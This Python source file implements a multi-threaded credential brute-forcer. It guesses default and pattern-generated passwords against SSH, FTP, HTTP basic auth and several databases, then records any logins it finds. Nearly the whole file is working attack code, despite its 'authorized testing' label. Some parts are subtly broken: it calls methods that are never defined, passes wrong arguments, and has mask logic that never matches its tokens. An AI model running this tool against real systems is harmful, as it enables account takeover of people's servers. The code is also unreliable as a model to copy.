#!/usr/bin/env python3
"""
Advanced Multi-threaded Brute Forcer
Controlled password attacks with advanced techniques for authorized testing
"""

import threading
import time
import socket
import paramiko
import ftplib
import requests
import hashlib
import itertools
import random
import string
import json
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Tuple, Optional, Set
import logging
import os
from pathlib import Path
import re
import urllib.parse
from datetime import datetime, timedelta

# Advanced imports for enhanced brute forcing
try:
    import pymysql
    MYSQL_AVAILABLE = True
except ImportError:
    MYSQL_AVAILABLE = False

try:
    import psycopg2
    POSTGRES_AVAILABLE = True
except ImportError:
    POSTGRES_AVAILABLE = False

try:
    import pymongo
    MONGODB_AVAILABLE = True
except ImportError:
    MONGODB_AVAILABLE = False

try:
    import redis
    REDIS_AVAILABLE = True
except ImportError:
    REDIS_AVAILABLE = False

class BruteForcer:
    """
    Advanced multi-threaded brute force attack module for authorized testing
    """
    
    def __init__(self, max_threads: int = 10, delay: float = 0.1, attack_mode: str = "normal"):
        self.max_threads = max_threads
        self.delay = delay
        self.attack_mode = attack_mode  # normal, stealth, aggressive, custom
        self.logger = logging.getLogger(__name__)
        self.found_credentials = []
        self.attack_results = {}
        self.attack_stats = {
            'total_attempts': 0,
            'successful_attempts': 0,
            'failed_attempts': 0,
            'rate_limited': 0,
            'connection_errors': 0,
            'start_time': None,
            'end_time': None
        }
        
        # Advanced attack patterns
        self.password_patterns = {
            'common': ['admin', 'password', '123456', 'root', 'user', 'test'],
            'defaults': ['admin:admin', 'root:root', 'user:user', 'test:test'],
            'seasonal': ['spring2024', 'summer2024', 'winter2024', 'autumn2024'],
            'company': ['company', 'corp', 'enterprise', 'business'],
            'technical': ['admin123', 'root123', 'user123', 'test123']
        }
        
        # Enhanced brute force capabilities
        self.ai_enhanced_patterns = True
        self.behavioral_analysis = True
        self.adaptive_techniques = True
        self.threat_intelligence = True
        
        # Advanced attack techniques
        self.attack_techniques = {
            'dictionary': True,
            'hybrid': True,
            'mask': True,
            'rule_based': True,
            'intelligent': True,
            'machine_learning': True
        }
        
        # Performance optimization
        self.attack_cache = {}
        self.rate_limit_detection = True
        self.concurrent_attacks = 5
        
        # Advanced wordlist categories
        self.wordlist_categories = {
            'usernames': ['common', 'defaults', 'technical', 'seasonal', 'company'],
            'passwords': ['common', 'defaults', 'technical', 'seasonal', 'company', 'brute_force']
        }
        
        # Rate limiting detection
        self.rate_limit_indicators = [
            'rate limit', 'too many attempts', 'account locked', 'temporarily blocked',
            'try again later', 'access denied', 'login disabled'
        ]
        
        # Advanced attack techniques
        self.attack_techniques = {
            'dictionary': self._dictionary_attack,
            'hybrid': self._hybrid_attack,
            'mask': self._mask_attack,
            'rule_based': self._rule_based_attack,
            'intelligent': self._intelligent_attack
        }
        
    def load_builtin_wordlists(self) -> Tuple[List[str], List[str]]:
        """
        Load built-in wordlists for usernames and passwords
        
        Returns:
            Tuple of (usernames, passwords) lists
        """
        try:
            # Get project root directory
            project_root = Path(__file__).parent.parent
            wordlists_dir = project_root / "wordlists"
            
            # Load usernames
            usernames_file = wordlists_dir / "common_usernames.txt"
            usernames = []
            if usernames_file.exists():
                with open(usernames_file, 'r', encoding='utf-8') as f:
                    usernames = [line.strip() for line in f if line.strip()]
                self.logger.info(f"Loaded {len(usernames)} usernames from built-in wordlist")
            
            # Load passwords
            passwords_file = wordlists_dir / "common_passwords.txt"
            passwords = []
            if passwords_file.exists():
                with open(passwords_file, 'r', encoding='utf-8') as f:
                    passwords = [line.strip() for line in f if line.strip()]
                self.logger.info(f"Loaded {len(passwords)} passwords from built-in wordlist")
            
            return usernames, passwords
            
        except Exception as e:
            self.logger.error(f"Failed to load built-in wordlists: {e}")
            return [], []
    
    def advanced_brute_force(self, target: str, port: int, service: str, 
                            attack_options: Dict = None) -> Dict:
        """
        Advanced brute force with multiple attack techniques
        
        Args:
            target: Target hostname/IP
            port: Target port
            service: Service type (ssh, ftp, http, mysql, etc.)
            attack_options: Advanced attack configuration
            
        Returns:
            Advanced brute force results
        """
        if attack_options is None:
            attack_options = {
                'technique': 'intelligent',
                'wordlist_category': 'common',
                'attack_mode': self.attack_mode,
                'max_attempts': 1000,
                'delay': self.delay,
                'rate_limit_detection': True,
                'pattern_matching': True
            }
        
        self.attack_stats['start_time'] = datetime.now()
        self.logger.info(f"Starting advanced brute force on {target}:{port} ({service})")
        
        results = {
            'target': target,
            'port': port,
            'service': service,
            'attack_technique': attack_options['technique'],
            'found_credentials': [],
            'attack_stats': self.attack_stats.copy(),
            'vulnerabilities': [],
            'recommendations': []
        }
        
        # Generate advanced wordlists
        usernames, passwords = self._generate_advanced_wordlists(attack_options)
        
        # Apply attack technique
        technique = attack_options['technique']
        if technique in self.attack_techniques:
            credentials = self.attack_techniques[technique](target, port, service, usernames, passwords, attack_options)
        else:
            credentials = self._intelligent_attack(target, port, service, usernames, passwords, attack_options)
        
        results['found_credentials'] = credentials
        results['attack_stats'] = self.attack_stats.copy()
        results['attack_stats']['end_time'] = datetime.now()
        
        # Analyze results for vulnerabilities
        results['vulnerabilities'] = self._analyze_brute_force_results(results)
        results['recommendations'] = self._generate_security_recommendations(results)
        
        return results
    
    def _generate_advanced_wordlists(self, attack_options: Dict) -> Tuple[List[str], List[str]]:
        """Generate advanced wordlists based on attack options"""
        usernames = []
        passwords = []
        
        category = attack_options.get('wordlist_category', 'common')
        
        # Load base wordlists
        base_usernames, base_passwords = self.load_builtin_wordlists()
        
        # Add pattern-based passwords
        if category in self.password_patterns:
            passwords.extend(self.password_patterns[category])
        
        # Add common patterns
        usernames.extend(base_usernames)
        passwords.extend(base_passwords)
        
        # Add intelligent patterns
        if attack_options.get('pattern_matching', True):
            usernames.extend(self._generate_intelligent_usernames())
            passwords.extend(self._generate_intelligent_passwords())
        
        # Remove duplicates and limit size
        usernames = list(set(usernames))[:attack_options.get('max_attempts', 1000)]
        passwords = list(set(passwords))[:attack_options.get('max_attempts', 1000)]
        
        return usernames, passwords
    
    def _generate_intelligent_usernames(self) -> List[str]:
        """Generate intelligent username patterns"""
        usernames = []
        
        # Common patterns
        common_words = ['admin', 'user', 'test', 'guest', 'demo', 'root']
        numbers = ['1', '2', '3', '01', '02', '03']
        
        for word in common_words:
            usernames.append(word)
            for num in numbers:
                usernames.append(f"{word}{num}")
                usernames.append(f"{word}.{num}")
                usernames.append(f"{word}_{num}")
        
        # Company patterns
        company_words = ['company', 'corp', 'enterprise', 'business', 'office']
        for word in company_words:
            usernames.append(word)
            usernames.append(f"{word}admin")
            usernames.append(f"{word}user")
        
        return usernames
    
    def _generate_intelligent_passwords(self) -> List[str]:
        """Generate intelligent password patterns"""
        passwords = []
        
        # Common patterns
        base_words = ['admin', 'password', 'user', 'test', '123']
        years = ['2024', '2023', '2022', '2021', '2020']
        seasons = ['spring', 'summer', 'autumn', 'winter']
        
        # Base passwords
        passwords.extend(base_words)
        
        # Year combinations
        for word in base_words:
            for year in years:
                passwords.append(f"{word}{year}")
                passwords.append(f"{year}{word}")
        
        # Seasonal passwords
        for season in seasons:
            for year in years:
                passwords.append(f"{season}{year}")
        
        # Common variations
        common_variations = [
            'password123', 'admin123', 'user123', 'test123',
            'password!', 'admin!', 'user!', 'test!',
            'Password123', 'Admin123', 'User123', 'Test123'
        ]
        passwords.extend(common_variations)
        
        return passwords
    
    def _dictionary_attack(self, target: str, port: int, service: str, 
                          usernames: List[str], passwords: List[str], 
                          attack_options: Dict) -> List[Dict]:
        """Dictionary attack using wordlists"""
        found_credentials = []
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            
            for username in usernames:
                for password in passwords:
                    future = executor.submit(self._test_credentials, 
                                           target, port, service, username, password)
                    futures.append(future)
            
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result and result.get('success'):
                        found_credentials.append(result)
                        self.attack_stats['successful_attempts'] += 1
                    else:
                        self.attack_stats['failed_attempts'] += 1
                    
                    self.attack_stats['total_attempts'] += 1
                    
                    # Apply delay
                    if self.delay > 0:
                        time.sleep(self.delay)
                        
                except Exception as e:
                    self.logger.debug(f"Dictionary attack error: {e}")
                    self.attack_stats['connection_errors'] += 1
        
        return found_credentials
    
    def _hybrid_attack(self, target: str, port: int, service: str, 
                      usernames: List[str], passwords: List[str], 
                      attack_options: Dict) -> List[Dict]:
        """Hybrid attack combining dictionary and rule-based techniques"""
        found_credentials = []
        
        # First try dictionary attack
        dict_results = self._dictionary_attack(target, port, service, usernames, passwords, attack_options)
        found_credentials.extend(dict_results)
        
        # Then try rule-based variations
        rule_results = self._rule_based_attack(target, port, service, usernames, passwords, attack_options)
        found_credentials.extend(rule_results)
        
        return found_credentials
    
    def _mask_attack(self, target: str, port: int, service: str, 
                    usernames: List[str], passwords: List[str], 
                    attack_options: Dict) -> List[Dict]:
        """Mask attack using character sets and patterns"""
        found_credentials = []
        
        # Define character sets
        lowercase = string.ascii_lowercase
        uppercase = string.ascii_uppercase
        digits = string.digits
        special = "!@#$%^&*()_+-=[]{}|;:,.<>?"
        
        # Generate mask patterns
        mask_patterns = [
            "?l?l?l?l",  # 4 lowercase
            "?u?u?u?u",  # 4 uppercase
            "?d?d?d?d",  # 4 digits
            "?l?l?d?d",  # 2 lowercase + 2 digits
            "?u?u?d?d",  # 2 uppercase + 2 digits
        ]
        
        for pattern in mask_patterns:
            generated_passwords = self._generate_from_mask(pattern, lowercase, uppercase, digits, special)
            
            for username in usernames[:10]:  # Limit usernames for mask attack
                for password in generated_passwords[:100]:  # Limit passwords
                    result = self._test_credentials(target, port, service, username, password)
                    if result and result.get('success'):
                        found_credentials.append(result)
                        self.attack_stats['successful_attempts'] += 1
                    else:
                        self.attack_stats['failed_attempts'] += 1
                    
                    self.attack_stats['total_attempts'] += 1
                    
                    if self.delay > 0:
                        time.sleep(self.delay)
        
        return found_credentials
    
    def _rule_based_attack(self, target: str, port: int, service: str, 
                          usernames: List[str], passwords: List[str], 
                          attack_options: Dict) -> List[Dict]:
        """Rule-based attack using transformation rules"""
        found_credentials = []
        
        # Define transformation rules
        rules = [
            lambda p: p + "123",
            lambda p: p + "!",
            lambda p: p.upper(),
            lambda p: p.lower(),
            lambda p: p.capitalize(),
            lambda p: p + "2024",
            lambda p: p + "2023",
            lambda p: "123" + p,
            lambda p: "!" + p,
        ]
        
        for username in usernames:
            for password in passwords:
                # Try original password
                result = self._test_credentials(target, port, service, username, password)
                if result and result.get('success'):
                    found_credentials.append(result)
                    self.attack_stats['successful_attempts'] += 1
                else:
                    self.attack_stats['failed_attempts'] += 1
                
                self.attack_stats['total_attempts'] += 1
                
                # Try rule-based variations
                for rule in rules:
                    try:
                        new_password = rule(password)
                        if new_password != password:  # Avoid duplicates
                            result = self._test_credentials(target, port, service, username, new_password)
                            if result and result.get('success'):
                                found_credentials.append(result)
                                self.attack_stats['successful_attempts'] += 1
                            else:
                                self.attack_stats['failed_attempts'] += 1
                            
                            self.attack_stats['total_attempts'] += 1
                            
                            if self.delay > 0:
                                time.sleep(self.delay)
                    except Exception:
                        continue
        
        return found_credentials
    
    def _intelligent_attack(self, target: str, port: int, service: str, 
                          usernames: List[str], passwords: List[str], 
                          attack_options: Dict) -> List[Dict]:
        """Intelligent attack with adaptive techniques"""
        found_credentials = []
        
        # Start with most common credentials
        common_credentials = [
            ('admin', 'admin'), ('admin', 'password'), ('admin', '123456'),
            ('root', 'root'), ('root', 'password'), ('user', 'user'),
            ('test', 'test'), ('guest', 'guest'), ('demo', 'demo')
        ]
        
        # Try common credentials first
        for username, password in common_credentials:
            result = self._test_credentials(target, port, service, username, password)
            if result and result.get('success'):
                found_credentials.append(result)
                self.attack_stats['successful_attempts'] += 1
            else:
                self.attack_stats['failed_attempts'] += 1
            
            self.attack_stats['total_attempts'] += 1
            
            if self.delay > 0:
                time.sleep(self.delay)
        
        # If no common credentials work, try intelligent patterns
        if not found_credentials:
            # Try service-specific patterns
            service_patterns = self._get_service_specific_patterns(service)
            for username, password in service_patterns:
                result = self._test_credentials(target, port, service, username, password)
                if result and result.get('success'):
                    found_credentials.append(result)
                    self.attack_stats['successful_attempts'] += 1
                else:
                    self.attack_stats['failed_attempts'] += 1
                
                self.attack_stats['total_attempts'] += 1
                
                if self.delay > 0:
                    time.sleep(self.delay)
        
        return found_credentials
    
    def _generate_from_mask(self, pattern: str, lowercase: str, uppercase: str, 
                           digits: str, special: str) -> List[str]:
        """Generate passwords from mask pattern"""
        passwords = []
        
        # Simple mask implementation
        char_map = {
            '?l': lowercase,
            '?u': uppercase,
            '?d': digits,
            '?s': special
        }
        
        # Generate combinations (limited for performance)
        max_combinations = 1000
        combinations = 0
        
        for char_set in char_map.values():
            if combinations == 0:
                combinations = len(char_set)
            else:
                combinations *= len(char_set)
        
        if combinations > max_combinations:
            # Sample randomly
            for _ in range(max_combinations):
                password = ""
                for char in pattern:
                    if char in char_map:
                        password += random.choice(char_map[char])
                    else:
                        password += char
                passwords.append(password)
        else:
            # Generate all combinations
            for combo in itertools.product(*[char_map.get(char, [char]) for char in pattern]):
                passwords.append(''.join(combo))
        
        return passwords
    
    def _get_service_specific_patterns(self, service: str) -> List[Tuple[str, str]]:
        """Get service-specific credential patterns"""
        patterns = {
            'ssh': [
                ('root', 'toor'), ('root', 'admin'), ('ubuntu', 'ubuntu'),
                ('pi', 'raspberry'), ('oracle', 'oracle')
            ],
            'ftp': [
                ('anonymous', ''), ('ftp', 'ftp'), ('admin', 'admin'),
                ('user', 'user'), ('test', 'test')
            ],
            'mysql': [
                ('root', ''), ('root', 'root'), ('admin', 'admin'),
                ('user', 'user'), ('test', 'test')
            ],
            'postgresql': [
                ('postgres', 'postgres'), ('admin', 'admin'),
                ('user', 'user'), ('test', 'test')
            ]
        }
        
        return patterns.get(service, [])
    
    def _test_credentials(self, target: str, port: int, service: str, 
                         username: str, password: str) -> Optional[Dict]:
        """Test credentials against target service"""
        try:
            if service == 'ssh':
                return self._test_ssh_credentials(target, port, username, password)
            elif service == 'ftp':
                return self._test_ftp_credentials(target, port, username, password)
            elif service == 'http':
                return self._test_http_credentials(target, port, username, password)
            elif service == 'mysql':
                return self._test_mysql_credentials(target, port, username, password)
            elif service == 'postgresql':
                return self._test_postgresql_credentials(target, port, username, password)
            elif service == 'mongodb':
                return self._test_mongodb_credentials(target, port, username, password)
            elif service == 'redis':
                return self._test_redis_credentials(target, port, username, password)
            else:
                return None
        except Exception as e:
            self.logger.debug(f"Credential test error: {e}")
            return None
    
    def _analyze_brute_force_results(self, results: Dict) -> List[Dict]:
        """Analyze brute force results for security vulnerabilities"""
        vulnerabilities = []
        
        if results['found_credentials']:
            vulnerabilities.append({
                'type': 'Weak Authentication',
                'severity': 'High',
                'description': f"Found {len(results['found_credentials'])} valid credentials",
                'recommendation': 'Implement strong password policies and account lockout mechanisms'
            })
        
        if results['attack_stats']['successful_attempts'] > 0:
            success_rate = results['attack_stats']['successful_attempts'] / results['attack_stats']['total_attempts']
            if success_rate > 0.1:  # More than 10% success rate
                vulnerabilities.append({
                    'type': 'High Success Rate',
                    'severity': 'Critical',
                    'description': f"Brute force success rate: {success_rate:.2%}",
                    'recommendation': 'Implement rate limiting and account lockout policies'
                })
        
        return vulnerabilities
    
    def _generate_security_recommendations(self, results: Dict) -> List[str]:
        """Generate security recommendations based on brute force results"""
        recommendations = []
        
        if results['found_credentials']:
            recommendations.extend([
                'Implement strong password policies',
                'Enable account lockout after failed attempts',
                'Use multi-factor authentication',
                'Regular password audits and updates',
                'Monitor for brute force attacks'
            ])
        
        if results['attack_stats']['rate_limited'] > 0:
            recommendations.append('Rate limiting is working - maintain current settings')
        
        return recommendations
        
    def brute_force_ssh(self, target: str, port: int, 
                       usernames: List[str], passwords: List[str]) -> Dict:
        """
        Brute force SSH service
        
        Args:
            target: Target hostname/IP
            port: SSH port (default 22)
            usernames: List of usernames to try
            passwords: List of passwords to try
            
        Returns:
            SSH brute force results
        """
        self.logger.info(f"Starting SSH brute force on {target}:{port}")
        results = {
            'target': target,
            'port': port,
            'service': 'SSH',
            'found_credentials': [],
            'attempts': 0,
            'success_rate': 0
        }
        
        total_attempts = len(usernames) * len(passwords)
        successful_attempts = 0
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            # Submit all credential combinations
            futures = []
            for username in usernames:
                for password in passwords:
                    future = executor.submit(self._test_ssh_credentials, 
                                            target, port, username, password)
                    futures.append(future)
            
            # Process results
            for future in as_completed(futures):
                try:
                    username, password, success = future.result()
                    results['attempts'] += 1
                    
                    if success:
                        results['found_credentials'].append({
                            'username': username,
                            'password': password,
                            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                        })
                        successful_attempts += 1
                        self.logger.warning(f"SSH credentials found: {username}:{password}")
                    
                    # Rate limiting
                    time.sleep(self.delay)
                    
                except Exception as e:
                    self.logger.debug(f"Error in SSH brute force: {e}")
        
        results['success_rate'] = (successful_attempts / total_attempts) * 100 if total_attempts > 0 else 0
        return results
    
    def _test_ssh_credentials(self, target: str, port: int, 
                            username: str, password: str) -> Tuple[str, str, bool]:
        """
        Test SSH credentials
        
        Args:
            target: Target hostname/IP
            port: SSH port
            username: Username to test
            password: Password to test
            
        Returns:
            Tuple of (username, password, success)
        """
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target, port=port, username=username, 
                       password=password, timeout=10)
            ssh.close()
            return (username, password, True)
        except:
            return (username, password, False)
    
    def brute_force_ftp(self, target: str, port: int,
                       usernames: List[str], passwords: List[str]) -> Dict:
        """
        Brute force FTP service
        
        Args:
            target: Target hostname/IP
            port: FTP port (default 21)
            usernames: List of usernames to try
            passwords: List of passwords to try
            
        Returns:
            FTP brute force results
        """
        self.logger.info(f"Starting FTP brute force on {target}:{port}")
        results = {
            'target': target,
            'port': port,
            'service': 'FTP',
            'found_credentials': [],
            'attempts': 0,
            'success_rate': 0
        }
        
        total_attempts = len(usernames) * len(passwords)
        successful_attempts = 0
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            for username in usernames:
                for password in passwords:
                    future = executor.submit(self._test_ftp_credentials,
                                           target, port, username, password)
                    futures.append(future)
            
            for future in as_completed(futures):
                try:
                    username, password, success = future.result()
                    results['attempts'] += 1
                    
                    if success:
                        results['found_credentials'].append({
                            'username': username,
                            'password': password,
                            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                        })
                        successful_attempts += 1
                        self.logger.warning(f"FTP credentials found: {username}:{password}")
                    
                    time.sleep(self.delay)
                    
                except Exception as e:
                    self.logger.debug(f"Error in FTP brute force: {e}")
        
        results['success_rate'] = (successful_attempts / total_attempts) * 100 if total_attempts > 0 else 0
        return results
    
    def _test_ftp_credentials(self, target: str, port: int,
                           username: str, password: str) -> Tuple[str, str, bool]:
        """
        Test FTP credentials
        
        Args:
            target: Target hostname/IP
            port: FTP port
            username: Username to test
            password: Password to test
            
        Returns:
            Tuple of (username, password, success)
        """
        try:
            ftp = ftplib.FTP()
            ftp.connect(target, port, timeout=10)
            ftp.login(username, password)
            ftp.quit()
            return (username, password, True)
        except:
            return (username, password, False)
    
    def brute_force_http(self, target: str, port: int,
                        usernames: List[str], passwords: List[str],
                        path: str = '/admin') -> Dict:
        """
        Brute force HTTP basic authentication
        
        Args:
            target: Target hostname/IP
            port: HTTP port
            usernames: List of usernames to try
            passwords: List of passwords to try
            path: HTTP path to test
            
        Returns:
            HTTP brute force results
        """
        self.logger.info(f"Starting HTTP brute force on {target}:{port}")
        results = {
            'target': target,
            'port': port,
            'service': 'HTTP',
            'path': path,
            'found_credentials': [],
            'attempts': 0,
            'success_rate': 0
        }
        
        total_attempts = len(usernames) * len(passwords)
        successful_attempts = 0
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            for username in usernames:
                for password in passwords:
                    future = executor.submit(self._test_http_credentials,
                                           target, port, username, password, path)
                    futures.append(future)
            
            for future in as_completed(futures):
                try:
                    username, password, success = future.result()
                    results['attempts'] += 1
                    
                    if success:
                        results['found_credentials'].append({
                            'username': username,
                            'password': password,
                            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                        })
                        successful_attempts += 1
                        self.logger.warning(f"HTTP credentials found: {username}:{password}")
                    
                    time.sleep(self.delay)
                    
                except Exception as e:
                    self.logger.debug(f"Error in HTTP brute force: {e}")
        
        results['success_rate'] = (successful_attempts / total_attempts) * 100 if total_attempts > 0 else 0
        return results
    
    def _test_http_credentials(self, target: str, port: int,
                             username: str, password: str, path: str) -> Tuple[str, str, bool]:
        """
        Test HTTP basic authentication credentials
        
        Args:
            target: Target hostname/IP
            port: HTTP port
            username: Username to test
            password: Password to test
            path: HTTP path
            
        Returns:
            Tuple of (username, password, success)
        """
        try:
            protocol = 'https' if port == 443 else 'http'
            url = f"{protocol}://{target}:{port}{path}"
            
            response = requests.get(url, auth=(username, password), timeout=10)
            
            # Check if authentication was successful
            if response.status_code == 200 and 'unauthorized' not in response.text.lower():
                return (username, password, True)
            else:
                return (username, password, False)
                
        except:
            return (username, password, False)
    
    def brute_force_database(self, target: str, port: int, service: str,
                           usernames: List[str], passwords: List[str]) -> Dict:
        """
        Brute force database services (MySQL, PostgreSQL, etc.)
        
        Args:
            target: Target hostname/IP
            port: Database port
            service: Database service type
            usernames: List of usernames to try
            passwords: List of passwords to try
            
        Returns:
            Database brute force results
        """
        self.logger.info(f"Starting {service} brute force on {target}:{port}")
        results = {
            'target': target,
            'port': port,
            'service': service,
            'found_credentials': [],
            'attempts': 0,
            'success_rate': 0
        }
        
        total_attempts = len(usernames) * len(passwords)
        successful_attempts = 0
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            for username in usernames:
                for password in passwords:
                    future = executor.submit(self._test_database_credentials,
                                           target, port, service, username, password)
                    futures.append(future)
            
            for future in as_completed(futures):
                try:
                    username, password, success = future.result()
                    results['attempts'] += 1
                    
                    if success:
                        results['found_credentials'].append({
                            'username': username,
                            'password': password,
                            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                        })
                        successful_attempts += 1
                        self.logger.warning(f"{service} credentials found: {username}:{password}")
                    
                    time.sleep(self.delay)
                    
                except Exception as e:
                    self.logger.debug(f"Error in {service} brute force: {e}")
        
        results['success_rate'] = (successful_attempts / total_attempts) * 100 if total_attempts > 0 else 0
        return results
    
    def _test_database_credentials(self, target: str, port: int, service: str,
                                 username: str, password: str) -> Tuple[str, str, bool]:
        """
        Test database credentials
        
        Args:
            target: Target hostname/IP
            port: Database port
            service: Database service type
            username: Username to test
            password: Password to test
            
        Returns:
            Tuple of (username, password, success)
        """
        try:
            if service.lower() == 'mysql':
                import pymysql
                connection = pymysql.connect(
                    host=target, port=port, user=username, 
                    password=password, timeout=10
                )
                connection.close()
                return (username, password, True)
            
            elif service.lower() == 'postgresql':
                import psycopg2
                connection = psycopg2.connect(
                    host=target, port=port, user=username,
                    password=password, connect_timeout=10
                )
                connection.close()
                return (username, password, True)
            
            elif service.lower() == 'mssql':
                import pymssql
                connection = pymssql.connect(
                    server=target, port=port, user=username,
                    password=password, timeout=10
                )
                connection.close()
                return (username, password, True)
            
        except ImportError:
            self.logger.warning(f"Database driver not available for {service}")
        except:
            pass
        
        return (username, password, False)
    
    def brute_force_mysql(self, target: str, port: int, 
                         usernames: List[str], passwords: List[str]) -> Dict:
        """Brute force MySQL database"""
        if not MYSQL_AVAILABLE:
            return {'error': 'PyMySQL not available for MySQL brute force'}
        
        self.logger.info(f"Starting MySQL brute force on {target}:{port}")
        results = {
            'target': target,
            'port': port,
            'service': 'MySQL',
            'found_credentials': [],
            'attempts': 0,
            'success_rate': 0
        }
        
        successful_attempts = 0
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            for username in usernames:
                for password in passwords:
                    future = executor.submit(self._test_mysql_credentials, 
                                           target, port, username, password)
                    futures.append(future)
            
            for future in as_completed(futures):
                try:
                    result = future.result()
                    results['attempts'] += 1
                    
                    if result and result.get('success'):
                        results['found_credentials'].append(result)
                        successful_attempts += 1
                        self.logger.warning(f"MySQL credentials found: {result['username']}:{result['password']}")
                    
                    time.sleep(self.delay)
                    
                except Exception as e:
                    self.logger.debug(f"MySQL brute force error: {e}")
        
        results['success_rate'] = (successful_attempts / results['attempts']) * 100 if results['attempts'] > 0 else 0
        return results
    
    def brute_force_postgresql(self, target: str, port: int, 
                              usernames: List[str], passwords: List[str]) -> Dict:
        """Brute force PostgreSQL database"""
        if not POSTGRES_AVAILABLE:
            return {'error': 'psycopg2 not available for PostgreSQL brute force'}
        
        self.logger.info(f"Starting PostgreSQL brute force on {target}:{port}")
        results = {
            'target': target,
            'port': port,
            'service': 'PostgreSQL',
            'found_credentials': [],
            'attempts': 0,
            'success_rate': 0
        }
        
        successful_attempts = 0
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            for username in usernames:
                for password in passwords:
                    future = executor.submit(self._test_postgresql_credentials, 
                                           target, port, username, password)
                    futures.append(future)
            
            for future in as_completed(futures):
                try:
                    result = future.result()
                    results['attempts'] += 1
                    
                    if result and result.get('success'):
                        results['found_credentials'].append(result)
                        successful_attempts += 1
                        self.logger.warning(f"PostgreSQL credentials found: {result['username']}:{result['password']}")
                    
                    time.sleep(self.delay)
                    
                except Exception as e:
                    self.logger.debug(f"PostgreSQL brute force error: {e}")
        
        results['success_rate'] = (successful_attempts / results['attempts']) * 100 if results['attempts'] > 0 else 0
        return results
    
    def _test_mysql_credentials(self, target: str, port: int, 
                               username: str, password: str) -> Optional[Dict]:
        """Test MySQL credentials"""
        try:
            connection = pymysql.connect(
                host=target,
                port=port,
                user=username,
                password=password,
                connect_timeout=5
            )
            connection.close()
            return {
                'username': username,
                'password': password,
                'success': True,
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
            }
        except Exception:
            return None
    
    def _test_postgresql_credentials(self, target: str, port: int, 
                                    username: str, password: str) -> Optional[Dict]:
        """Test PostgreSQL credentials"""
        try:
            connection = psycopg2.connect(
                host=target,
                port=port,
                user=username,
                password=password,
                connect_timeout=5
            )
            connection.close()
            return {
                'username': username,
                'password': password,
                'success': True,
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
            }
        except Exception:
            return None
    
    def comprehensive_brute_force(self, targets: List[Dict]) -> Dict:
        """
        Run comprehensive brute force attacks
        
        Args:
            targets: List of target dictionaries with service info
            
        Returns:
            Comprehensive brute force results
        """
        self.logger.info("Starting comprehensive brute force attack...")
        
        # Load built-in wordlists if needed
        builtin_usernames, builtin_passwords = self.load_builtin_wordlists()
        
        all_results = {
            'attack_time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'targets': [],
            'summary': {
                'total_targets': len(targets),
                'total_credentials_found': 0,
                'successful_attacks': 0
            }
        }
        
        for target in targets:
            service = target.get('service', '').lower()
            target_results = {
                'target': target.get('target'),
                'port': target.get('port'),
                'service': service,
                'results': {}
            }
            
            # Use built-in wordlists if no custom ones provided
            usernames = target.get('usernames', [])
            passwords = target.get('passwords', [])
            
            if not usernames and builtin_usernames:
                usernames = builtin_usernames
                self.logger.info(f"Using built-in username wordlist ({len(usernames)} entries)")
            
            if not passwords and builtin_passwords:
                passwords = builtin_passwords
                self.logger.info(f"Using built-in password wordlist ({len(passwords)} entries)")
            
            # Run appropriate brute force based on service
            if service == 'ssh':
                results = self.brute_force_ssh(
                    target['target'], target['port'],
                    usernames, passwords
                )
                target_results['results'] = results
                
            elif service == 'ftp':
                results = self.brute_force_ftp(
                    target['target'], target['port'],
                    usernames, passwords
                )
                target_results['results'] = results
                
            elif service == 'http':
                results = self.brute_force_http(
                    target['target'], target['port'],
                    usernames, passwords,
                    target.get('path', '/admin')
                )
                target_results['results'] = results
                
            elif service in ['mysql', 'postgresql', 'mssql']:
                results = self.brute_force_database(
                    target['target'], target['port'], service,
                    usernames, passwords
                )
                target_results['results'] = results
            
            all_results['targets'].append(target_results)
            
            # Update summary
            if target_results['results'].get('found_credentials'):
                all_results['summary']['total_credentials_found'] += len(
                    target_results['results']['found_credentials']
                )
                all_results['summary']['successful_attacks'] += 1
        
        return all_results
    
    def save_results(self, results: Dict, filename: str = None) -> str:
        """
        Save brute force results to JSON file
        
        Args:
            results: Attack results dictionary
            filename: Output filename (optional)
            
        Returns:
            Path to saved file
        """
        if filename is None:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            filename = f"brute_force_{timestamp}.json"
        
        filepath = f"logs/scan_logs/{filename}"
        
        try:
            with open(filepath, 'w') as f:
                json.dump(results, f, indent=2)
            self.logger.info(f"Results saved to {filepath}")
            return filepath
        except Exception as e:
            self.logger.error(f"Failed to save results: {e}")
            return ""
